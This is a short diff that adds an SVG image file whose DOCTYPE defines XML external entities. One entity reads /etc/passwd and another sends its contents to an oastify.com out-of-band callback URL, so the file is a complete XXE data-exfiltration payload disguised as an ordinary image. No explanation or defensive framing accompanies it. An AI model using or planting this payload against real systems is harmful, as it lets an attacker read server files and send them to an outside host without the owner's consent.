@@ -1,0 +1,8 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY send SYSTEM "http://tgd19cy979pqcb2eet62pl82nttkhda1z.oastify.com/capturar?data=&xxe;">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text y="20">&send;</text>
+</svg>
